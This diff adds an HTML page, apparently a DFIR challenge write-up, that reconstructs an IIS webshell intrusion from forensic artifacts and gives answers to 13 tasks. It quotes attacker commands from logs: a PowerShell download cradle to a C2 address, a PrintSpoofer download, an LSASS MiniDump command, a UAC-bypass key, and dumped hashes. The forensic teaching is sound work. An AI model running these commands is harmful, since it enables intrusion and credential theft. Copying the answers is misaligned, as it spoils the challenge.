@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<meta name="theme-color" content="#030305"/>
+<title>Hollow Service - Sherlock Write Up | pumkin</title>
+<meta name="description" content="Hollow Service DFIR Sherlock write up: reconstructing an IIS webshell intrusion from KAPE triage artifacts."/>
+<link rel="icon" href="../cat.png"/>
+<style>
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+:root{--bg:#030305;--border:rgba(255,255,255,.06);--text:#fafafa;--muted:#9ca3af;--dim:#6b7280;--purple:#c084fc;--emerald:#34d399}
+body{background:var(--bg);color:var(--text);font-family:'Inter',system-ui,-apple-system,sans-serif;min-height:100vh;overflow-x:hidden;position:relative}body::before{content:'';position:fixed;inset:0;background:linear-gradient(rgba(255,255,255,.015) 1px,transparent 1px),linear-gradient(90deg,rgba(255,255,255,.015) 1px,transparent 1px);background-size:60px 60px;z-index:0;pointer-events:none}.cyber-grid{position:fixed;inset:0;z-index:0;pointer-events:none;overflow:hidden}.cyber-grid::before{content:'';position:absolute;width:100%;height:100%;background:radial-gradient(circle at 50% 0%,rgba(168,85,247,.08),transparent 50%)}
+main{position:relative;z-index:1;min-height:100vh;width:100%;padding:2rem 1rem}@media(min-width:768px){main{padding:3rem 2rem}}.max-w{max-width:72rem;width:100%;margin:0 auto}.nav-row{display:flex;align-items:center;gap:1rem;margin-bottom:2rem;flex-wrap:wrap}.back-btn{display:inline-flex;align-items:center;gap:.5rem;padding:.5rem 1rem;border-radius:.75rem;background:rgba(255,255,255,.03);border:1px solid var(--border);color:var(--muted);text-decoration:none;font-family:monospace;font-size:.75rem;text-transform:uppercase;letter-spacing:.1em}.back-btn:hover{color:#c084fc;border-color:rgba(168,85,247,.5)}.back-btn.active{color:#fff;border-color:#a855f7;background:rgba(168,85,247,.15)}.icon-sm{width:14px;height:14px}.panel{background:#0a0b0f;border:1px solid var(--border);border-radius:1rem;overflow:hidden}.writeup-body{padding:2rem;max-width:60rem;margin:0 auto}@media(min-width:768px){.writeup-body{padding:3rem}}.meta{color:var(--dim);font-size:.75rem;font-family:monospace;letter-spacing:.1em;text-transform:uppercase;margin-bottom:1rem}h1{font-size:1.75rem;font-weight:800;text-transform:uppercase;margin-bottom:1.5rem}@media(min-width:768px){h1{font-size:2.5rem}}h2{font-size:1.25rem;color:var(--purple);margin:2.5rem 0 1rem;padding-bottom:.5rem;border-bottom:1px solid var(--border)}p,li{color:var(--muted);font-size:.95rem;line-height:1.75}p{margin-bottom:1rem}ul,ol{margin:0 0 1rem 1.25rem}li{margin-bottom:.25rem}strong{color:var(--text)}code{font-family:monospace;font-size:.85rem;background:rgba(168,85,247,.1);color:var(--purple);padding:2px 6px;border-radius:6px}pre{background:rgba(0,0,0,.5);border:1px solid var(--border);border-radius:.75rem;padding:1rem;margin:1rem 0;font:.8rem/1.6 monospace;color:var(--emerald);white-space:pre-wrap;overflow-wrap:anywhere}.info-grid{display:grid;grid-template-columns:1fr;gap:.75rem;margin:1rem 0}@media(min-width:768px){.info-grid{grid-template-columns:repeat(3,1fr)}}.info-cell{background:rgba(0,0,0,.3);border:1px solid var(--border);border-radius:.75rem;padding:1rem}.lbl{color:var(--dim);font:.65rem monospace;text-transform:uppercase;letter-spacing:.1em;margin-bottom:.25rem}.val{font-size:.9rem;font-weight:600}.tag{display:inline-block;padding:2px 10px;border-radius:9999px;font:.7rem monospace;letter-spacing:.1em;text-transform:uppercase}.tag-medium{background:rgba(251,191,36,.1);border:1px solid rgba(251,191,36,.3);color:#fbbf24}.tag-dfir{background:rgba(168,85,247,.1);border:1px solid rgba(168,85,247,.3);color:var(--purple)}.footer{text-align:center;padding-top:3rem;color:var(--dim);font:10px monospace;letter-spacing:.15em;text-transform:uppercase}
+</style>
+</head>
+<body><div class="cyber-grid"></div><main><div class="max-w">
+<div class="nav-row"><a href="../challenges.html" class="back-btn active"><svg class="icon-sm" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="m12 19-7-7 7-7"/><path d="M19 12H5"/></svg>Challenges</a><a href="../writeups.html" class="back-btn">Machines</a><a href="../index.html" class="back-btn">Home</a></div>
+<div class="panel"><div class="writeup-body"><p class="meta">sherlock / dfir / medium</p><h1>Hollow Service</h1>
+<div class="info-grid"><div class="info-cell"><div class="lbl">Type</div><div class="val"><span class="tag tag-dfir">DFIR</span></div></div><div class="info-cell"><div class="lbl">Difficulty</div><div class="val"><span class="tag tag-medium">Medium</span></div></div><div class="info-cell"><div class="lbl">Focus</div><div class="val">Windows intrusion reconstruction</div></div></div>
+
+<h2>Scenario</h2><p>A Windows 10 workstation hosting an internal IIS application was flagged after unusual process creation activity originating from the IIS worker process. The endpoint was isolated, and a KAPE triage collection was taken before shutdown.</p><p>The investigation reconstructs the intrusion from IIS access, webshell upload and rename activity, PowerShell execution, token impersonation, UAC bypass activity, LSASS dumping, and local credential findings.</p>
+
+<h2>Task 1</h2><p>What source IP address was used for the attacker's IIS requests?</p><p>IIS logs typically live under <code>C:\inetpub\logs\LogFiles\W3SVC1\</code>. Rather than reading every line manually, filter for suspicious behavior:</p><pre>cs-method = POST
+sc-status = 200, 201, 204
+cs-uri-stem = upload endpoints
+cs-uri-stem = .aspx, .ashx, .asmx
+cs-uri-query containing cmd, exec, shell, upload, file
+unusual User-Agent
+large or unusual time-taken values
+
+Useful strings:
+cmd=
+command=
+exec
+powershell
+Invoke-
+FromBase64String
+whoami
+net user
+certutil
+bitsadmin
+upload
+multipart/form-data
+.aspx</pre><p>Suspicious GET requests contain the parameter <code>cmd=whoami</code>.</p><p><strong>Answer:</strong> <code>192.168.100.2</code></p>
+
+<h2>Task 2</h2><p>What IIS substatus code was returned when the threat actor first probed <code>/internalapp/upload.aspx</code>?</p><pre>2026-05-16 10:36:17 192.168.100.31 GET /internalapp/upload.aspx - 80 - 192.168.100.2 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/142.0.0.0+Safari/537.36 - 404 3 50 908</pre><p>In the IIS log format, inspect the <code>sc-substatus</code> column.</p><p><strong>Answer:</strong> <code>3</code></p>
+
+<h2>Task 3</h2><p>What is the full filesystem path where the webshell was initially saved?</p><p>Run MFTECmd once to produce an MFT CSV. Open <code>output\mft.csv</code> in Calc, enable column filters, and filter <code>ParentPath</code> for <code>inetpub\internalapp\uploads</code>. Inspect the ASPX entries, particularly <code>shell.aspx</code> and <code>status.aspx</code>.</p><p><strong>Answer:</strong> <code>C:\inetpub\internalapp\uploads\shell.aspx</code></p>
+
+<h2>Task 4</h2><p>The webshell was renamed after the initial upload. What name was it given?</p><p>Parse the collected USN journal with MFTECmd. Open <code>output\usn.csv</code> in Calc, filter <code>Name</code> for <code>shell.aspx</code> and <code>status.aspx</code>, and inspect rows containing <code>RenameOldName</code> or <code>RenameNewName</code> in <code>UpdateReasons</code>. Sort by <code>UpdateSequenceNumber</code>.</p><p>The matching file reference <code>314640-6</code> and parent entry <code>314622</code> confirm that both names belong to the same file. Returning to the IIS log shows the actor invoking <code>uploads/shell.aspx</code> at <code>10:43:52 UTC</code>, followed by a successful invocation of <code>uploads/status.aspx</code> at <code>10:49:42 UTC</code>.</p><p><strong>Answer:</strong> <code>status.aspx</code></p>
+
+<h2>Task 5</h2><p>What is the full decoded PowerShell command passed through the webshell?</p><p>The IIS log records the encoded command:</p><pre>2026-05-16 10:47:55 192.168.100.31 GET /internalapp/status.aspx cmd=powershell+-nop+-sta+-w+hidden+-enc+SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwA0ADYALgAxADAAMQAuADEAOAA5AC4AMgAyADQALwBzAHYAYwAnACkAKQA%3d 80 - 192.168.100.2 curl/8.15.0 - 404 0 0 21</pre><p>Base64-decode the value:</p><pre>IEX ((new-object net.webclient).downloadstring('http://46.101.189.224/svc'))</pre><p><strong>Answer:</strong> <code>IEX ((new-object net.webclient).downloadstring('http://46.101.189.224/svc'))</code></p>
+
+<h2>Task 6</h2><p>What is the C2 IP address the stager connects to?</p><p>The address is visible in the decoded command from Task 5.</p><p><strong>Answer:</strong> <code>46.101.189.224</code></p>
+
+<h2>Task 7</h2><p>What Windows account ran the IIS worker process at the time of the intrusion?</p><p>Process creation events are recorded in <code>C:\Windows\System32\winevt\Logs\Microsoft-Windows-Sysmon%4Operational.evtx</code>. Since the first command executed was <code>whoami</code>, search Sysmon Event ID 1 for that command:</p><pre>EventID: 1
+UtcTime: 2026-05-16 11:08:08.893
+Image: C:\Windows\System32\cmd.exe
+CommandLine: "cmd.exe" /c whoami
+CurrentDirectory: c:\windows\system32\inetsrv\
+User: DESKTOP-B36HA4E\svcapp
+IntegrityLevel: High
+ParentImage: C:\Windows\System32\inetsrv\w3wp.exe
+ParentCommandLine: c:\windows\system32\inetsrv\w3wp.exe -ap "svcappPool" -v "v4.0" -l "webengine4.dll" -a \\.\pipe\iisipma76d19bf-27c1-4c6a-bb5c-bdc4f5e7e67a -h "C:\inetpub\temp\apppools\svcappPool\svcappPool.config" -w "" -m 0 -t 20 -ta 0
+ParentUser: DESKTOP-B36HA4E\svcapp</pre><p><strong>Answer:</strong> <code>DESKTOP-B36HA4E\svcapp</code></p>
+
+<h2>Task 8</h2><p>What privilege held by that account enabled escalation to SYSTEM?</p><p>Inspect Security Event ID 4672 for the <code>svcapp</code> account. Its privilege list includes:</p><pre>SeAssignPrimaryTokenPrivilege
+SeTcbPrivilege
+SeSecurityPrivilege
+SeTakeOwnershipPrivilege
+SeLoadDriverPrivilege
+SeBackupPrivilege
+SeRestorePrivilege
+SeDebugPrivilege
+SeAuditPrivilege
+SeSystemEnvironmentPrivilege
+SeImpersonatePrivilege
+SeDelegateSessionUserImpersonatePrivilege</pre><p><strong>Answer:</strong> <code>SeImpersonatePrivilege</code></p>
+
+<h2>Task 9</h2><p>An executable was created in <code>C:\Windows\Temp\</code> after the PowerShell stager request. What tool does VirusTotal identify it as?</p><p>Security Event ID 4688 shows the stager downloading the file:</p><pre>EventID: 4688
+SystemTime: 2026-05-16T10:57:02.077020Z
+SubjectUserName: svcapp
+NewProcessName: C:\Windows\System32\cmd.exe
+CommandLine: C:\Windows\system32\cmd.exe /C powershell -c "Invoke-WebRequest 'http://46.101.189.224:8888/MicrosoftEdgeUpdate.exe' -OutFile 'C:\Windows\Temp\MicrosoftEdgeUpdate.exe'"</pre><p>The executable is <code>MicrosoftEdgeUpdate.exe</code>. Locate its prefetch entry in the MFT data:</p><pre>309728,Valid,In Use,File,4,58126,0,MICROSOFTEDGEUPDATE.EXE-C91A3157.pf,,2026-05-16T10:58:14.249Z</pre><p>Inspect the prefetch file with PECmd:</p><pre>dotnet /opt/PECmd/PECmd.dll -f C/Windows/prefetch/MICROSOFTEDGEUPDATE.EXE-C91A3157.pf
+
+Directories referenced: 4
+00: \VOLUME{01dcce2ce083b5b1-94e0b374}\WINDOWS
+01: \VOLUME{01dcce2ce083b5b1-94e0b374}\WINDOWS\APPPATCH
+02: \VOLUME{01dcce2ce083b5b1-94e0b374}\WINDOWS\SYSTEM32
+03: \VOLUME{01dcce2ce083b5b1-94e0b374}\WINDOWS\TEMP (Keyword True)</pre><p>This confirms the executable path as <code>\WINDOWS\TEMP\MICROSOFTEDGEUPDATE.EXE</code>. Parse the Amcache hive:</p><pre>dotnet /opt/Amcache/AmcacheParser.dll -f C/Windows/AppCompat/Programs/Amcache.hve -csv amcache2.csv</pre><pre>Unassociated,0006d4b2b38d80f5a41d7c747710cabd308d0000ffff,2026-05-16 10:58:14,188098b9caf3bc4d1b68dcad50d2e1cbd2e9d519,False,c:\windows\temp\microsoftedgeupdate.exe,MicrosoftEdgeUpdate.exe,.exe,2020-09-10 17:43:27,,27136,,,microsoftedgeupd|1fa8a47b2feeb2d4,pe64_amd64,False,,,385298656,0,,,,,microsoftedgeupd|1fa8a47b2feeb2d4,,</pre><p>Submit the SHA256 hash <code>188098b9caf3bc4d1b68dcad50d2e1cbd2e9d519</code> to VirusTotal.</p><p><strong>Answer:</strong> <code>PrintSpoofer</code></p>
+
+<h2>Task 10</h2><p>What registry key was modified for the UAC bypass attempt?</p><p>Read the service account's Classes hive with RECmd:</p><pre>dotnet /opt/RECmd/RECmd.dll -f '.\C\Users\svcapp\AppData\Local\Microsoft\Windows\UsrClass.dat' --kn 'ms-settings\Shell\Open\command'</pre><p>In the user's registry view, this resolves to:</p><pre>HKCU\Software\Classes\ms-settings\Shell\Open\command</pre><p><strong>Answer:</strong> <code>HKCU\Software\Classes\ms-settings\Shell\Open\command</code></p>
+
+<h2>Task 11</h2><p>Which non-built-in local user account has no password set?</p><p>Dump the local SAM hashes:</p><pre>impacket-secretsdump -sam C/Windows/System32/config/SAM -system C/Windows/System32/config/SYSTEM LOCAL
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
+
+[*] Target system bootKey: 0xa1ce16dc90da5a179668a3ecd5af83fd
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:0fb36bd736cd7d0bade164fa63fbe95c:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:150d66ac4de439685067cfa46afa4b64:::
+Joe:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+svcapp:1002:aad3b435b51404eeaad3b435b51404ee:b2d2067922988992de2e1270ec203699:::
+jsmith:1003:aad3b435b51404eeaad3b435b51404ee:8d6dac2d255c49012c84b70407af0910:::</pre><p>The NTLM hash for an empty password is <code>31d6cfe0d16ae931b73c59d7e0c089c0</code>. <code>Joe</code> has that hash.</p><p><strong>Answer:</strong> <code>Joe</code></p>
+
+<h2>Task 12</h2><p>What is the full command line used to dump LSASS memory?</p><p>Search Security Event ID 4688 payloads for <code>comsvcs.dll</code> or <code>MiniDump</code>:</p><pre>EventID: 4688
+SystemTime: 2026-05-16T11:00:50.262003Z
+NewProcessName: C:\Windows\System32\rundll32.exe
+CommandLine: rundll32.exe  C:\Windows\System32\comsvcs.dll, MiniDump 708 C:\Windows\Temp\lsass.dmp full
+ParentProcessName: C:\Windows\System32\cmd.exe
+MandatoryLabel: S-1-16-16384</pre><p><strong>Answer:</strong></p><pre>rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 708 C:\Windows\Temp\lsass.dmp full</pre>
+
+<h2>Task 13</h2><p>What MITRE ATT&amp;CK sub-technique describes the mechanism of the identified privilege escalation tool?</p><p>VirusTotal's Behavior page identifies Access Token Manipulation under Privilege Escalation, specifically Token Impersonation/Theft.</p><p><strong>Answer:</strong> <code>T1134.001</code></p>
+</div></div><p class="footer">pumkin / challenges</p>
+</div></main></body></html>
